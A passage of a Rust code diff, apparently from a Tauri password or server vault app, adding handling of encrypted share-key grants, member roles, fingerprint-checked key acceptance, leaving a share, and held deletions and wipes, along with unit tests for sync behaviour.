+/// may have changed, and with a key it doesn't have this device can neither
+/// read what's new nor write anything the others can read. It then only pulls,
+/// and the page asks the user to unlock sharing (`share_key_state`), or says
+/// the grant won't open when that was tried. A profile from before grants were
+/// kept starts from what the server has now.
+fn note_share_grant(conn: &Connection, sealed_dek: &str, role: &str, opened: Option<&[u8]>, unlocked: bool) -> Result<(), String> {
+    note_share_role(conn, role)?;
+    let seen = grant_tag(sealed_dek);
+    let put = |key: &str| {
+        conn.execute(
+            "INSERT INTO sync_meta(key,value) VALUES(?1,?2) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+            [key, &seen],
+        )
+        .map_err(|e| format!("[SHARE] NOTE_GRANT: {e}"))
+    };
+    let settled = || {
+        conn.execute("DELETE FROM sync_meta WHERE key IN ('share_grant_unread','share_grant_refused')", [])
+            .map_err(|e| format!("[SHARE] NOTE_GRANT: {e}"))
+    };
+    let known: Option<String> = conn.query_row("SELECT value FROM sync_meta WHERE key='share_grant'", [], |r| r.get(0)).ok();
+    match opened.filter(|key| key.len() == 32) {
+        Some(key) => {
+            note_share_key(conn, key)?;
+            put("share_grant")?;
+            settled()?;
+        }
+        None if known.is_none() => {
+            put("share_grant")?;
+        }
+        None if known.as_deref() == Some(seen.as_str()) => {
+            settled()?;
+        }
+        None => {
+            put("share_grant_unread")?;
+            if unlocked {
+                put("share_grant_refused")?;
+            }
+        }
+    }
+    Ok(())
+}
+
+/// The grant waiting to be read is one a sync tried with sharing unlocked, and
+/// it wouldn't open, so unlocking won't help. The two have to name the same
+/// grant: a newer one hasn't been tried.
+fn grant_refused(conn: &Connection) -> bool {
+    let meta = |k: &str| conn.query_row("SELECT value FROM sync_meta WHERE key=?1", [k], |r| r.get::<_, String>(0)).ok();
+    let unread = meta("share_grant_unread");
+    unread.is_some() && unread == meta("share_grant_refused")
+}
+
+/// The role the server says this device's user has now. The owner can change
+/// it any time, and nothing else tells a member: an editor made a viewer would
+/// have every push refused, and a viewer made an editor would never push. Only
+/// a member's role moves, between those two: an owner stays one, and no answer
+/// makes anyone an owner here.
+fn note_share_role(conn: &Connection, role: &str) -> Result<(), String> {
+    if role != "editor" && role != "user" {
+        return Ok(());
+    }
+    conn.execute(
+        "UPDATE sync_meta SET value=?1 WHERE key='share_role' AND value<>'owner'",
+        [role],
+    )
+    .map_err(|e| format!("[SHARE] NOTE_ROLE: {e}"))?;
+    Ok(())
+}
+
+/// A key change is waiting on the user: a new key to accept, or a grant this
+/// device couldn't open. Either way it only pulls until that's dealt with.
+fn share_key_is_waiting(conn: &Connection) -> bool {
+    conn.query_row("SELECT 1 FROM sync_meta WHERE key IN ('pending_dek','share_grant_unread')", [], |_| Ok(()))
+        .is_ok()
+}
+
 /// A short fingerprint of a share key, for people to compare: the owner's
 /// Profile panel shows the key's, a member's prompt shows a new key's. A
 /// truncated hash of a random 256-bit key gives nothing of the key away.
@@ -2379,46 +2711,83 @@ struct ShareKeyState {
     current: Option<String>,
     /// The fingerprint of a new key waiting for the user's OK.
     pending: Option<String>,
+    /// The server has a grant this device hasn't opened (`note_share_grant`).
+    grant_unread: bool,
+    /// A sync tried that grant with sharing unlocked, and it wouldn't open.
+    grant_refused: bool,
+    /// The sharing identity is unlocked. With `grant_unread` and no
+    /// `grant_refused`, the next sync that reaches the server opens it.
+    identity_unlocked: bool,
 }
 
 /// The open profile's share key, and a new one waiting for the user's OK, as
-/// fingerprints. Nothing for a profile that isn't shared.
+/// fingerprints, and whether the sync is held up by a grant it couldn't open.
+/// Nothing for a profile that isn't shared.
 #[tauri::command]
-async fn share_key_state(db_state: tauri::State<'_, DbState>) -> Result<ShareKeyState, String> {
+async fn share_key_state(
+    db_state: tauri::State<'_, DbState>,
+    cloud: tauri::State<'_, std::sync::Arc<cloud::CloudState>>,
+) -> Result<ShareKeyState, String> {
+    let identity_unlocked = cloud.identity().await.is_some();
     let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
     let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
     let meta = |k: &str| conn.query_row("SELECT value FROM sync_meta WHERE key=?1", [k], |r| r.get::<_, String>(0)).ok();
     if meta("share_id").is_none() {
-        return Ok(ShareKeyState { current: None, pending: None });
+        return Ok(ShareKeyState { current: None, pending: None, grant_unread: false, grant_refused: false, identity_unlocked });
     }
     Ok(ShareKeyState {
         current: meta("dek").as_deref().and_then(key_fingerprint),
         pending: meta("pending_dek").as_deref().and_then(key_fingerprint),
+        grant_unread: meta("share_grant_unread").is_some(),
+        grant_refused: grant_refused(conn),
+        identity_unlocked,
     })
 }
 
 /// Use the new key the server says the open shared profile has (see
 /// `note_share_key`): the user's call, made after comparing its fingerprint
-/// with the owner's. The next sync uploads again, with it.
+/// with the owner's. `fingerprint` is the one the user was shown. The next
+/// sync uploads again, with it.
 #[tauri::command]
-async fn accept_share_key(db_state: tauri::State<'_, DbState>) -> Result<(), String> {
+async fn accept_share_key(db_state: tauri::State<'_, DbState>, fingerprint: String) -> Result<(), String> {
     {
         let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
         let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
-        let pending: String = conn
-            .query_row("SELECT value FROM sync_meta WHERE key='pending_dek'", [], |r| r.get(0))
-            .map_err(|_| "[SHARE] NO_KEY_CHANGE: there's no new key waiting.")?;
-        let tx = conn.unchecked_transaction().map_err(|e| format!("[SHARE] TX: {e}"))?;
-        tx.execute(
-            "INSERT INTO sync_meta(key,value) VALUES('dek',?1) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
-            [&pending],
-        )
-        .map_err(|e| format!("[SHARE] SET_DEK: {e}"))?;
-        tx.execute("DELETE FROM sync_meta WHERE key='pending_dek'", [])
-            .map_err(|e| format!("[SHARE] CLEAR_PENDING: {e}"))?;
-        tx.commit().map_err(|e| format!("[SHARE] TX_COMMIT: {e}"))?;
+        take_pending_key(conn, &fingerprint)?;
     }
     save_vault_async(&db_state).await
+}
+
+/// `accept_share_key` on the vault: the key the user checked or nothing. A
+/// sync can replace the waiting key while the dialog is open, and it's the one
+/// the user compared that they said yes to.
+///
+/// Every row is marked to go out again, as when the owner replaces the key
+/// (`bump_for_new_key`): what this device pushed under the old key would
+/// otherwise stay on the server, unreadable to everyone else, because the same
+/// stamp again changes nothing there. A viewer's rows don't go anywhere.
+fn take_pending_key(conn: &Connection, fingerprint: &str) -> Result<(), String> {
+    let pending: String = conn
+        .query_row("SELECT value FROM sync_meta WHERE key='pending_dek'", [], |r| r.get(0))
+        .map_err(|_| "[SHARE] NO_KEY_CHANGE: there's no new key waiting.")?;
+    if key_fingerprint(&pending).as_deref() != Some(fingerprint) {
+        return Err("[SHARE] KEY_CHANGED: another key came in while you were checking that one. Compare the new fingerprint with the owner's.".into());
+    }
+    let role: String = conn
+        .query_row("SELECT value FROM sync_meta WHERE key='share_role'", [], |r| r.get(0))
+        .unwrap_or_else(|_| "user".to_string());
+    let tx = conn.unchecked_transaction().map_err(|e| format!("[SHARE] TX: {e}"))?;
+    tx.execute(
+        "INSERT INTO sync_meta(key,value) VALUES('dek',?1) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+        [&pending],
+    )
+    .map_err(|e| format!("[SHARE] SET_DEK: {e}"))?;
+    tx.execute("DELETE FROM sync_meta WHERE key='pending_dek'", [])
+        .map_err(|e| format!("[SHARE] CLEAR_PENDING: {e}"))?;
+    if role != "user" {
+        bump_for_new_key(&tx)?;
+    }
+    tx.commit().map_err(|e| format!("[SHARE] TX_COMMIT: {e}"))
 }
 
 #[cfg(test)]
@@ -2656,6 +3025,12 @@ async fn share_current_profile(
             [],
         )
         .map_err(|e| format!("[SHARE] STORE_ROLE: {e}"))?;
+        // The grant just made is the one to compare with (`note_share_grant`).
+        conn.execute(
+            "INSERT INTO sync_meta(key,value) VALUES('share_grant',?1) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+            [grant_tag(&sealed_self)],
+        )
+        .map_err(|e| format!("[SHARE] STORE_GRANT: {e}"))?;
     }
     save_vault_async(&db_state).await?;
     Ok(ShareResult { share_id })
@@ -2961,6 +3336,9 @@ async fn restore_personal_profile(
     if profile_path(&app, &local_name)?.exists() {
         return Err(format!("Profile '{}' already exists", local_name));
     }
+    // Getting a profile from the cloud is wanting it there, whatever was
+    // deleted on this device before.
+    set_cloud_deleted(&cloud_deleted_path(&app)?, &cloud_deleted_key(session.base(), &cloud_profile), false)?;
     *db_state.active_profile.lock().map_err(|_| "[STATE] LOCK_FAILED")? = Some(local_name.clone());
     // `opened` pins the new profile: the writes and the sync below go to it
     // and nowhere else.
@@ -3041,7 +3419,8 @@ async fn share_set_role(
 /// `/shares/create` replaces the owner's own grant. The owner's next sync
 /// re-uploads every record under the new key (`bump_for_new_key` makes the
 /// server take them), and remaining members are offered the new key on their
-/// next sync (`note_share_key`). Returns the members who weren't given it.
+/// next sync (`note_share_key`). Returns who wasn't given it, and who got it
+/// with no key of theirs on record here to check against.
 async fn rotate_share_dek(
     app: &tauri::AppHandle,
     db_state: &tauri::State<'_, DbState>,
@@ -3050,7 +3429,7 @@ async fn rotate_share_dek(
     share_id: &str,
     share_name: &str,
     generation: u64,
-) -> Result<Vec<LeftOut>, String> {
+) -> Result<RevokeResult, String> {
     let (my_pub, _) = cloud.identity().await.ok_or("[SHARE] IDENTITY_LOCKED")?;
     let mut fresh = [0u8; 32];
     rand::rng().fill_bytes(&mut fresh);
@@ -3141,7 +3520,7 @@ async fn rotate_share_dek(
         tx.commit().map_err(|e| format!("[SHARE] TX_COMMIT: {e}"))?;
     }
     save_vault_async(db_state).await?;
-    Ok(left_out)
+    Ok(RevokeResult { left_out, first_seen: first_seen.into_iter().map(|(email, _)| email).collect() })
 }
 
 /// Marks every synced row to go out again after its share's key is replaced.
@@ -3213,10 +3592,9 @@ async fn share_revoke(
              They can no longer reach the server, but they still hold the old key. Use Replace the key to try again."
         )
     };
-    let left_out = replace_share_key(&app, &db_state, &cloud, &session, &share_id, generation)
+    replace_share_key(&app, &db_state, &cloud, &session, &share_id, generation)
         .await
-        .map_err(not_rotated)?;
-    Ok(RevokeResult { left_out })
+        .map_err(not_rotated)
 }
 
 /// Owner: replace the open shared profile's key, as removing a member does.
@@ -3239,8 +3617,7 @@ async fn share_replace_key(
         own_share(conn, &share_id)?;
         (share_id, db_state.generation_now())
     };
-    let left_out = replace_share_key(&app, &db_state, &cloud, &session, &share_id, generation).await?;
-    Ok(RevokeResult { left_out })
+    replace_share_key(&app, &db_state, &cloud, &session, &share_id, generation).await
 }
 
 /// Replace a share's key and put everything on the server under it. A sync
@@ -3255,7 +3632,7 @@ async fn replace_share_key(
     session: &cloud::Session,
     share_id: &str,
     generation: u64,
-) -> Result<Vec<LeftOut>, String> {
+) -> Result<RevokeResult, String> {
     sync_with(app, db_state, cloud, session, Some(generation)).await?;
     let name = {
         let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
@@ -3273,12 +3650,12 @@ async fn replace_share_key(
             .clone()
             .unwrap_or_else(|| "profile".to_string()),
     };
-    let left_out = rotate_share_dek(app, db_state, cloud, session, share_id, &name, generation).await?;
+    let result = rotate_share_dek(app, db_state, cloud, session, share_id, &name, generation).await?;
     // The rows are marked by now, so if this upload fails, the next sync does it.
     if let Err(e) = sync_with(app, db_state, cloud, session, Some(generation)).await {
         eprintln!("[SHARE] uploading under the new key failed, the next sync tries again: {e}");
     }
-    Ok(left_out)
+    Ok(result)
 }
 
 #[derive(serde::Serialize)]
@@ -3286,6 +3663,11 @@ struct RevokeResult {
     /// Members who weren't given the new key, so can't read what changes from
     /// now on until they're invited again.
     left_out: Vec<LeftOut>,
+    /// Members given the new key with no key of theirs on record here to
+    /// check against (invited before keys were kept, or from another device).
+    /// The owner should know each of them: the list comes from the server,
+    /// and a name it added would get the key too.
+    first_seen: Vec<String>,
 }
 
 /// Non-owner: leave a share.
@@ -3324,6 +3706,9 @@ struct ProfileShareStatus {
     current_server: String,
     /// Whether that is a self-hosted one, not the default.
     custom_server: bool,
+    /// Deleted from the cloud on this device: it isn't uploaded until the
+    /// user says so (`cloud_resume_profile`).
+    cloud_deleted: bool,
 }
 
 /// Everything the in-app Profile panel needs about the OPEN profile, read in one
@@ -3332,11 +3717,12 @@ struct ProfileShareStatus {
 /// sharing identity are ready. The member roster is fetched separately.
 #[tauri::command]
 async fn profile_share_status(
+    app: tauri::AppHandle,
     db_state: tauri::State<'_, DbState>,
     cloud: tauri::State<'_, std::sync::Arc<cloud::CloudState>>,
 ) -> Result<ProfileShareStatus, String> {
     // Scoped so both std MutexGuards drop before the awaits below.
-    let (profile, share_id, role, cloud_server) = {
+    let (profile, share_id, role, cloud_server, cloud_profile) = {
         let profile = db_state
             .active_profile
             .lock()
@@ -3351,13 +3737,16 @@ async fn profile_share_status(
                 let role: Option<String> = conn
                     .query_row("SELECT value FROM sync_meta WHERE key='share_role'", [], |r| r.get(0))
                     .ok();
-                (profile, sid, role, profile_server(conn))
+                let cloud_profile = profile.as_deref().map(|p| cloud_profile_of(conn, p));
+                (profile, sid, role, profile_server(conn), cloud_profile)
             }
-            None => (profile, None, None, None),
+            None => (profile, None, None, None, None),
         }
     };
     let st = cloud.status().await;
     let current_server = cloud.base().await;
+    let cloud_deleted = share_id.is_none()
+        && cloud_profile.is_some_and(|p| is_cloud_deleted(&cloud_deleted_path(&app).unwrap_or_default(), &cloud_deleted_key(&current_server, &p)));
     Ok(ProfileShareStatus {
         profile,
         share_id,
@@ -3368,6 +3757,7 @@ async fn profile_share_status(
         cloud_server,
         custom_server: current_server != cloud::CLOUD_API_BASE,
         current_server,
+        cloud_deleted,
     })
 }
 
@@ -3447,18 +3837,49 @@ async fn stop_sharing(
         // Only the profile this was asked for: another one opened meanwhile
         // would otherwise lose its own share link.
         db_state.still_open(generation)?;
-        conn.execute("DELETE FROM sync_meta WHERE key IN ('share_id','share_role','share_name','pending_dek')", [])
-            .map_err(|e| format!("[SHARE] CLEAR_META: {e}"))?;
-        conn.execute("DELETE FROM share_member_keys WHERE share_id=?1", [&share_id])
-            .map_err(|e| format!("[SHARE] CLEAR_PINS: {e}"))?;
-        // Deletions held from the share don't come again once it's left.
-        conn.execute("DELETE FROM held_deletions", [])
-            .map_err(|e| format!("[SHARE] CLEAR_HELD: {e}"))?;
+        let hlc = db_state.hlc.lock().map_err(|_| "[STATE] LOCK_HLC")?.as_ref().ok_or("[SYNC] NO_HLC")?.clone();
+        leave_share_locally(conn, &share_id, &role, &hlc)?;
     }
     save_vault_async(&db_state).await
 }
 
-/// The deletions held in the open shared profile (approvals::hold_deletions).
+/// What ending or leaving a share does to the open vault.
+fn leave_share_locally(conn: &Connection, share_id: &str, role: &str, hlc: &hlc::Hlc) -> Result<(), String> {
+    conn.execute(
+        "DELETE FROM sync_meta WHERE key IN ('share_id','share_role','share_name','pending_dek','share_grant','share_grant_unread','share_grant_refused')",
+        [],
+    )
+    .map_err(|e| format!("[SHARE] CLEAR_META: {e}"))?;
+    conn.execute("DELETE FROM share_member_keys WHERE share_id=?1", [share_id])
+        .map_err(|e| format!("[SHARE] CLEAR_PINS: {e}"))?;
+    // What was held from the share doesn't come again once it's left.
+    conn.execute_batch("DELETE FROM held_deletions; DELETE FROM held_wipes;")
+        .map_err(|e| format!("[SHARE] CLEAR_HELD: {e}"))?;
+    // The profile goes back to syncing as a personal one, and its key may have
+    // changed while it was shared. A stamp of its own gets the escrow past the
+    // one on the server, which holds the key from before, or restoring with
+    // the password would open a key none of the rows are sealed with.
+    conn.execute(
+        "INSERT INTO sync_meta(key,value) VALUES('escrow_stamp',?1) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
+        [hlc.tick()],
+    )
+    .map_err(|e| format!("[SHARE] ESCROW_STAMP: {e}"))?;
+    // A member's copy came from the share, so it has no partition of its own,
+    // and the one named after it may well be somebody else's profile. (An
+    // owner's profile with no row syncs under its name, and stays there.)
+    if role != "owner" {
+        conn.execute(
+            "INSERT INTO sync_meta(key,value) VALUES('cloud_profile',?1) ON CONFLICT(key) DO NOTHING",
+            [new_entity_uuid()],
+        )
+        .map_err(|e| format!("[SHARE] CLOUD_PROFILE: {e}"))?;
+    }
+    Ok(())
+}
+
+/// What is held in the open shared profile: deletions
+/// (approvals::hold_deletions) and records that would empty a secret
+/// (approvals::hold_wipe).
 #[tauri::command]
 async fn held_deletions_list(db_state: tauri::State<'_, DbState>) -> Result<Vec<approvals::HeldDeletion>, String> {
     let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
@@ -3466,22 +3887,24 @@ async fn held_deletions_list(db_state: tauri::State<'_, DbState>) -> Result<Vec<
     Ok(approvals::held_deletions(conn))
 }
 
-/// The user's call on the deletions held in a shared profile: `delete_them`
-/// deletes those rows here too. Otherwise they stay, with a stamp newer than
-/// the deletion's, so the next sync brings them back for everyone.
+/// The user's call on what is held in a shared profile: `delete_them` deletes
+/// those rows here too, and empties what was emptied. Otherwise they stay as
+/// they are, with a stamp newer than the deletion's or the record's, so the
+/// next sync brings them back for everyone.
 #[tauri::command]
 async fn resolve_held_deletions(db_state: tauri::State<'_, DbState>, delete_them: bool) -> Result<usize, String> {
     let done = {
         let conn_g = db_state.conn.lock().map_err(|_| "[STATE] LOCK_CONN")?;
         let conn = conn_g.as_ref().ok_or("[STATE] DB_NOT_OPEN")?;
         let hlc = db_state.hlc.lock().map_err(|_| "[STATE] LOCK_HLC")?.as_ref().ok_or("[SYNC] NO_HLC")?.clone();
-        resolve_held(conn, &hlc, delete_them)?
+        let (dek, _) = get_or_create_dek(conn)?;
+        resolve_held(conn, &dek, &hlc, delete_them)?
     };
     save_vault_async(&db_state).await?;
     Ok(done)
 }
 
-fn resolve_held(conn: &Connection, hlc: &hlc::Hlc, delete_them: bool) -> Result<usize, String> {
+fn resolve_held(conn: &Connection, key: &[u8; 32], hlc: &hlc::Hlc, delete_them: bool) -> Result<usize, String> {
     let held: Vec<(String, String, String)> = {
         let mut stmt = conn
             .prepare("SELECT uuid, entity_type, updated_at FROM held_deletions")
@@ -3491,6 +3914,7 @@ fn resolve_held(conn: &Connection, hlc: &hlc::Hlc, delete_them: bool) -> Result<
             .map_err(|e| format!("[SYNC] HELD: {e}"))?;
         rows.filter_map(Result::ok).collect()
     };
+    let wipes = approvals::held_wipes(conn);
     // Like a merge: the triggers stay out of it (no tombstone of our own for a
     // deletion, no stamp for a kept row but the one set here).
     conn.execute("INSERT INTO sync_flags(key,val) VALUES('merge',1) ON CONFLICT(key) DO UPDATE SET val=1", [])
@@ -3520,9 +3944,32 @@ fn resolve_held(conn: &Connection, hlc: &hlc::Hlc, delete_them: bool) -> Result<
                 .map_err(|e| format!("[SYNC] KEEP: {e}"))?;
             }
         }
+        let mut fixups = Vec::new();
+        for rec in &wipes {
+            let Some(spec) = ENTITIES.iter().find(|s| s.table == rec.entity_type) else { continue };
+            if delete_them {
+                // As the merge would have: whatever else the record changes
+                // that runs by itself is still held.
+                let watch = approvals::watches(spec.table);
+                let before = if watch { approvals::snapshot(&tx, spec.table, &rec.uuid) } else { None };
+                match apply_entity(&tx, key, spec, rec, false, &mut fixups) {
+                    Ok(()) if watch => approvals::hold_changes(&tx, spec.table, &rec.uuid, before.as_ref())?,
+                    Ok(()) => {}
+                    Err(e) => eprintln!("[SYNC] held record not applied uuid={}: {e}", rec.uuid),
+                }
+            } else {
+                tx.execute(
+                    &format!("UPDATE {} SET updated_at=?1 WHERE uuid=?2", spec.table),
+                    rusqlite::params![stamp_past(&hlc.tick(), &rec.updated_at), rec.uuid],
+                )
+                .map_err(|e| format!("[SYNC] KEEP: {e}"))?;
+            }
+        }
+        repair_links(&tx, fixups);
         tx.execute("DELETE FROM held_deletions", []).map_err(|e| format!("[SYNC] HELD_CLEAR: {e}"))?;
+        tx.execute("DELETE FROM held_wipes", []).map_err(|e| format!("[SYNC] HELD_CLEAR: {e}"))?;
         tx.commit().map_err(|e| format!("[SYNC] TX_COMMIT: {e}"))?;
-        Ok(held.len())
+        Ok(held.len() + wipes.len())
     })();
     let _ = conn.execute("UPDATE sync_flags SET val=0 WHERE key='merge'", []);
     done
@@ -3582,7 +4029,7 @@ mod sync_engine_tests {
         let salt = [3u8; SALT_LEN];
         let password = "correct horse battery staple";
         let master_key = derive_key(password, &salt).unwrap();
-        let rec = build_pw_escrow_record(&master_key, &salt, &dek).unwrap();
+        let rec = build_pw_escrow_record(&master_key, &salt, &dek, ESCROW_UAT).unwrap();
         assert_eq!(rec.entity_type, ESCROW_ETYPE);
         assert_eq!(rec.uuid, ESCROW_UUID);
 
@@ -4022,13 +4469,13 @@ mod sync_engine_tests {
     // deletion's tombstone — and nothing once all of it went up.
     #[test]
     fn a_delta_push_carries_only_what_changed() {
-        let (a, _ha) = device("A");
+        let (a, ha) = device("A");
         a.execute("INSERT INTO folders(name) VALUES('f1')", []).unwrap();
         a.execute("INSERT INTO folders(name) VALUES('f2')", []).unwrap();
         a.execute("INSERT INTO servers(name, host, port) VALUES('s1','h',22)", []).unwrap();
         let first = collect_local_records(&a, &KEY, "").unwrap();
         assert_eq!(first.len(), 3);
-        let cursor = pushed_through_after("", &first, true);
+        let cursor = pushed_through_after("", &first, true, &ha.tick());
         assert!(collect_local_records(&a, &KEY, &cursor).unwrap().is_empty(), "nothing new");
 
         a.execute("UPDATE folders SET name='f1b' WHERE name='f1'", []).unwrap();
@@ -4042,13 +4489,45 @@ mod sync_engine_tests {
             vec![("folders".into(), false), ("folders".into(), true), ("notes".into(), false)],
             "the edit, the new row and the tombstone"
         );
-        let cursor = pushed_through_after(&cursor, &delta, true);
+        let cursor = pushed_through_after(&cursor, &delta, true, &ha.tick());
         assert!(collect_local_records(&a, &KEY, &cursor).unwrap().is_empty());
         // Nothing pushed (a viewer, a key change waiting): the cursor stays.
         a.execute("UPDATE servers SET host='h2'", []).unwrap();
         let held = collect_local_records(&a, &KEY, &cursor).unwrap();
-        assert_eq!(pushed_through_after(&cursor, &held, false), cursor);
+        assert_eq!(pushed_through_after(&cursor, &held, false, &ha.tick()), cursor);
         assert_eq!(collect_local_records(&a, &KEY, &cursor).unwrap().len(), 1, "so it goes next time");
+    }
+
+    // One row stamped further ahead than this device's clock follows (a peer's
+    // clock an hour fast): the cursor stays with the clock, so what's edited
+    // and deleted here afterwards still goes up.
+    #[test]
+    fn a_row_stamped_far_ahead_does_not_stop_this_devices_edits() {
+        let (a, ha) = device("A");
+        a.execute("INSERT INTO folders(name) VALUES('mine')", []).unwrap();
+        a.execute("INSERT INTO notes(title, body) VALUES('gone soon','b')", []).unwrap();
+        let (p, _hp) = device("P");
+        p.execute("INSERT INTO servers(name,host,port) VALUES('s','h',22)", []).unwrap();
+        let mut from_peer = collect_local_records(&p, &KEY, "").unwrap();
+        from_peer[0].updated_at = ahead(60 * 60 * 1000);
+        assert_eq!(apply_remote_records(&a, &KEY, &from_peer, &ha).unwrap(), 0);
+
+        let collected = collect_local_records(&a, &KEY, "").unwrap();
+        let clock = ha.tick();
+        let cursor = pushed_through_after("", &collected, true, &clock);
+        assert_eq!(cursor, clock, "not past what this device's clock has reached");
+        assert!(collect_local_records(&a, &KEY, &cursor).unwrap().iter().all(|r| r.updated_at == from_peer[0].updated_at));
+
+        a.execute("UPDATE folders SET name='edited'", []).unwrap();
+        a.execute("DELETE FROM notes", []).unwrap();
+        let delta = collect_local_records(&a, &KEY, &cursor).unwrap();
+        assert!(delta.iter().any(|r| r.entity_type == "folders" && !r.deleted), "the edit goes up");
+        assert!(delta.iter().any(|r| r.entity_type == "notes" && r.deleted), "and so does the deletion");
+        // Stamps the clock has passed are still the cursor, as before.
+        let (b, hb) = device("B");
+        b.execute("INSERT INTO folders(name) VALUES('f')", []).unwrap();
+        let sent = collect_local_records(&b, &KEY, "").unwrap();
+        assert_eq!(pushed_through_after("", &sent, true, &hb.tick()), sent[0].updated_at);
     }
 
     // Delta sync, the pull side: what couldn't be applied is counted, so the
@@ -4578,12 +5057,12 @@ mod sync_engine_tests {
     #[test]
     fn held_deletions_are_deleted_or_kept_by_the_user() {
         let (_a, _ha, b, hb, _batch) = mass_deleted();
-        assert_eq!(resolve_held(&b, &hb, true).unwrap(), 12);
+        assert_eq!(resolve_held(&b, &KEY, &hb, true).unwrap(), 12);
         assert_eq!((count(&b, "servers"), count(&b, "sync_tombstones")), (3, 12));
         assert!(approvals::held_deletions(&b).is_empty());
 
         let (a, ha, b, hb, batch) = mass_deleted();
-        assert_eq!(resolve_held(&b, &hb, false).unwrap(), 12);
+        assert_eq!(resolve_held(&b, &KEY, &hb, false).unwrap(), 12);
         assert_eq!(count(&b, "servers"), 15);
         assert!(approvals::held_deletions(&b).is_empty());
         apply_remote_records(&a, &KEY, &collect_local_records(&b, &KEY, "").unwrap(), &ha).unwrap();
@@ -4598,6 +5077,634 @@ mod sync_engine_tests {
         assert_eq!(stamp_past("000000000000005:00000:me", del), "999999999999990:00008:peer");
         assert_eq!(stamp_past("999999999999999:00000:me", del), "999999999999999:00000:me");
         assert_eq!(stamp_past("000000000000005:00000:me", "999999999999990:99999:peer"), "000000000000005:00000:me");
+    }
+
+    fn meta(c: &Connection, key: &str) -> Option<String> {
+        c.query_row("SELECT value FROM sync_meta WHERE key=?1", [key], |r| r.get(0)).ok()
+    }
+
+    /// A member's device: on a share under `KEY`, with the given role.
+    fn member(node: &str, role: &str) -> (Connection, std::sync::Arc<hlc::Hlc>) {
+        let (c, h) = shared_device(node);
+        c.execute(
+            "INSERT INTO sync_meta(key,value) VALUES('dek',?1),('share_role',?2)",
+            rusqlite::params![hex::encode(KEY), role],
+        )
+        .unwrap();
+        (c, h)
+    }
+
+    // A member with sharing locked can't open their grant, and that's after
+    // every restart. They can still see that it changed: then the device only
+    // pulls, until the grant has been opened and any new key accepted.
+    #[test]
+    fn a_grant_that_changed_while_sharing_was_locked_stops_the_uploads() {
+        let (m, _h) = member("M", "editor");
+        // From before grants were kept: where it starts from, not a change.
+        note_share_grant(&m, "aa", "editor", None, false).unwrap();
+        assert!(!share_key_is_waiting(&m));
+        note_share_grant(&m, "aa", "editor", None, false).unwrap();
+        assert!(!share_key_is_waiting(&m), "the same grant, locked, is nothing new");
+
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(share_key_is_waiting(&m), "the owner replaced the key");
+        assert_eq!(meta(&m, "pending_dek"), None, "and nothing is known of the key yet");
+
+        // Sharing unlocked: the grant opens, and the new key waits for the OK.
+        let new_key = hex::encode([2u8; 32]);
+        note_share_grant(&m, "bb", "editor", Some(&[2u8; 32]), true).unwrap();
+        assert_eq!(meta(&m, "pending_dek").as_deref(), Some(new_key.as_str()));
+        assert_eq!(meta(&m, "share_grant_unread"), None);
+        assert!(share_key_is_waiting(&m), "still only pulling");
+        take_pending_key(&m, &key_fingerprint(&new_key).unwrap()).unwrap();
+        assert!(!share_key_is_waiting(&m));
+
+        // Locked again (every Lock and restart): this grant is known now.
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(!share_key_is_waiting(&m));
+    }
+
+    // Sealing is random, so the same key sealed again looks like a change
+    // until it's opened; and a server that goes back to the grant it had
+    // changed nothing.
+    #[test]
+    fn a_grant_that_turns_out_the_same_ends_the_wait() {
+        let (m, _h) = member("M", "editor");
+        note_share_grant(&m, "aa", "editor", None, false).unwrap();
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(share_key_is_waiting(&m));
+        note_share_grant(&m, "bb", "editor", Some(&KEY), true).unwrap();
+        assert!(!share_key_is_waiting(&m), "the key in use, sealed again");
+        assert_eq!(meta(&m, "pending_dek"), None);
+
+        note_share_grant(&m, "cc", "editor", None, false).unwrap();
+        assert!(share_key_is_waiting(&m));
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(!share_key_is_waiting(&m), "back to the one opened here");
+    }
+
+    // Unlocked, and it still won't open: it stays unread, so nothing goes up
+    // under a key the others may have left. Anything but a 32-byte key is no key.
+    #[test]
+    fn a_grant_that_wont_open_keeps_this_device_pulling() {
+        let (m, _h) = member("M", "editor");
+        note_share_grant(&m, "aa", "editor", Some(&KEY), true).unwrap();
+        note_share_grant(&m, "bb", "editor", Some(&[1u8; 16]), true).unwrap();
+        assert!(share_key_is_waiting(&m));
+        assert_eq!(meta(&m, "pending_dek"), None);
+        assert_eq!(meta(&m, "dek"), Some(hex::encode(KEY)));
+    }
+
+    // "It won't open" is only true once a sync tried with sharing unlocked.
+    // Unlocking while offline tries nothing, so it stays a grant still to be
+    // read, and telling the member to ask for a new invitation would be wrong.
+    #[test]
+    fn a_grant_is_called_refused_only_once_a_sync_tried_it() {
+        let (m, _h) = member("M", "editor");
+        note_share_grant(&m, "aa", "editor", Some(&KEY), true).unwrap();
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(share_key_is_waiting(&m) && !grant_refused(&m), "locked: not tried yet");
+
+        note_share_grant(&m, "bb", "editor", None, true).unwrap();
+        assert!(grant_refused(&m), "tried, and it doesn't open");
+        // After a Lock it's the same grant, and it still won't open.
+        note_share_grant(&m, "bb", "editor", None, false).unwrap();
+        assert!(grant_refused(&m));
+
+        note_share_grant(&m, "cc", "editor", None, false).unwrap();
+        assert!(share_key_is_waiting(&m) && !grant_refused(&m), "a newer grant hasn't been tried");
+
+        note_share_grant(&m, "cc", "editor", Some(&KEY), true).unwrap();
+        assert!(!share_key_is_waiting(&m) && !grant_refused(&m));
+        assert_eq!(meta(&m, "share_grant_refused"), None);
+    }
+
+    // The owner changes a member's role and nothing else tells them.
+    #[test]
+    fn the_role_follows_the_server_but_no_answer_makes_or_unmakes_an_owner() {
